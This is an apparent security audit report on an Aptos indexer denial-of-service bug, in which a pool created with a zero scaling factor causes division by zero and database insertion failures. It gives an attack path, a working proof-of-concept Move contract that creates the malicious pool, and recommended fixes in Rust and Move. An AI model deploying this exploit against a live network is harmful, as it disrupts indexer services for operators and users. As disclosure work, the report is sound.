# Audit Report

## Title
Indexer Denial of Service via Zero Scaling Factor in pool_u64_unbound Pool Resources

## Summary
The Aptos indexer performs unvalidated division by `scaling_factor` when processing `pool_u64_unbound::Pool` resources, allowing an attacker to create pools with `scaling_factor = 0` that cause database insertion failures and indexer service disruption.

## Finding Description
The vulnerability exists in the indexer's stake models where `scaling_factor` from deserialized `Pool` resources is used as a divisor without validation. When a `Pool` with `scaling_factor = 0` is stored on-chain, the indexer attempts to divide by zero, producing BigDecimal infinity/NaN values that PostgreSQL's NUMERIC type cannot store.

**Attack Path:**
1. Attacker deploys a custom Move contract importing `aptos_std::pool_u64_unbound`
2. Contract calls `pool_u64_unbound::create_with_scaling_factor(0)` to create a malicious Pool
3. Pool is stored in a table on-chain (e.g., as part of a delegation pool structure)
4. Indexer processes the WriteTableItem containing the Pool resource
5. Division by zero occurs in multiple locations, producing infinite BigDecimal values
6. PostgreSQL NUMERIC column insertion fails (does not support infinity/NaN)
7. Indexer transaction fails, retry with `clean_data_for_db` still fails
8. Indexer crashes, hangs, or skips the transaction, causing service disruption

**Vulnerable Code Locations:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

**Root Cause in Move Contract:**

The `pool_u64_unbound` module allows creation of pools with any `scaling_factor` value, including zero: [6](#0-5) 

While the official `delegation_pool` uses a safe constant, any contract can use `pool_u64_unbound` independently: [7](#0-6) 

The indexer processes ALL `pool_u64_unbound::Pool` types, not just from delegation pools: [8](#0-7) 

## Impact Explanation
**Severity: Medium**

This vulnerability causes indexer service disruption, which qualifies as "State inconsistencies requiring intervention" under Medium severity criteria. The impact includes:

- **Indexer Availability**: Service crashes or hangs when processing malicious transactions
- **Data Inconsistency**: Indexer database becomes out-of-sync with blockchain state
- **Manual Intervention Required**: Operators must identify and skip problematic transactions
- **API Service Disruption**: Applications relying on indexer APIs lose historical query capabilities

The vulnerability does NOT affect:
- Blockchain consensus or validator operations (core protocol remains operational)
- Fund security or theft (no financial loss)
- Network liveness or partition (validators continue producing blocks)

## Likelihood Explanation
**Likelihood: Medium-High**

- **Attacker Requirements**: Minimal - any user can deploy Move contracts
- **Cost**: Only transaction gas fees to deploy contract and create malicious Pool
- **Detection**: Difficult to detect before exploitation
- **Mitigation**: No current validation prevents zero scaling factors

The attack is straightforward and requires no special privileges, making it highly likely if discovered by a malicious actor.

## Recommendation

**Immediate Fix - Add validation in indexer:**
```rust
// In delegator_pools.rs around line 130-132
let total_shares = if inner.active_shares.scaling_factor.is_zero() {
    return Err(anyhow::anyhow!("Invalid scaling_factor: cannot be zero"));
} else {
    &inner.active_shares.total_shares / &inner.active_shares.scaling_factor
};

// Similar checks at lines 160, and in delegator_balances.rs at lines 90, 151
```

**Long-term Fix - Validate at Move contract level:**
```move
// In pool_u64_unbound.move, modify create_with_scaling_factor:
public fun create_with_scaling_factor(scaling_factor: u64): Pool {
    assert!(scaling_factor > 0, EINVALID_SCALING_FACTOR);
    Pool {
        total_coins: 0,
        total_shares: 0,
        shares: table::new<address, u128>(),
        scaling_factor,
    }
}
```

Add new error constant:
```move
const EINVALID_SCALING_FACTOR: u64 = 8;
```

## Proof of Concept

**Move Contract (malicious_pool.move):**
```move
module attacker::malicious_pool {
    use aptos_std::pool_u64_unbound;
    use aptos_std::table;
    
    struct MaliciousPoolStore has key {
        pools: table::Table<u64, pool_u64_unbound::Pool>,
    }
    
    public entry fun create_zero_scaling_pool(account: &signer) {
        // Create pool with scaling_factor = 0
        let malicious_pool = pool_u64_unbound::create_with_scaling_factor(0);
        
        // Store in table (triggers indexer processing)
        if (!exists<MaliciousPoolStore>(signer::address_of(account))) {
            move_to(account, MaliciousPoolStore {
                pools: table::new(),
            });
        };
        
        let store = borrow_global_mut<MaliciousPoolStore>(signer::address_of(account));
        table::add(&mut store.pools, 0, malicious_pool);
    }
}
```

**Expected Behavior:**
1. Deploy and execute `create_zero_scaling_pool`
2. Pool with `scaling_factor = 0` stored on-chain
3. Indexer processes WriteTableItem for the pool
4. Division by zero produces BigDecimal infinity
5. PostgreSQL insertion fails with: `ERROR: invalid input syntax for type numeric: "Infinity"`
6. Indexer error handling triggers, but retry fails with same error
7. Indexer crashes, hangs, or skips transaction depending on error handling configuration

**Notes**
The vulnerability is specific to the **indexer infrastructure** and does not affect the core Aptos blockchain protocol. Validators continue operating normally, and the blockchain state remains consistent. However, off-chain services depending on indexer APIs experience disruption. The fix should be implemented at both the indexer validation layer (immediate mitigation) and the Move contract layer (prevents malicious pool creation at source).

### Citations

**File:** crates/indexer/src/models/stake_models/stake_utils.rs (L24-33)
```rust
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PoolResource {
    pub shares: SharesInnerResource,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub total_coins: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub total_shares: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub scaling_factor: BigDecimal,
}
```

**File:** crates/indexer/src/models/stake_models/stake_utils.rs (L101-106)
```rust
        match data_type {
            "0x1::pool_u64_unbound::Pool" => {
                serde_json::from_value(data.clone()).map(|inner| Some(StakeTableItem::Pool(inner)))
            },
            _ => Ok(None),
        }
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L130-132)
```rust
            let total_coins = inner.active_shares.total_coins;
            let total_shares =
                &inner.active_shares.total_shares / &inner.active_shares.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_pools.rs (L159-160)
```rust
            let total_coins = inner.total_coins;
            let total_shares = &inner.total_shares / &inner.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L89-90)
```rust
                ))?;
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** crates/indexer/src/models/stake_models/delegator_balances.rs (L150-151)
```rust
                ))?;
            let shares = shares / &pool_balance.scaling_factor;
```

**File:** aptos-move/framework/aptos-stdlib/sources/pool_u64_unbound.move (L62-69)
```text
    /// Create a new pool with custom `scaling_factor`.
    public fun create_with_scaling_factor(scaling_factor: u64): Pool {
        Pool {
            total_coins: 0,
            total_shares: 0,
            shares: table::new<address, u128>(),
            scaling_factor,
        }
```

**File:** aptos-move/framework/aptos-framework/sources/delegation_pool.move (L246-247)
```text
    /// Scaling factor of shares pools used within the delegation pool
    const SHARES_SCALING_FACTOR: u64 = 10000000000000000;
```
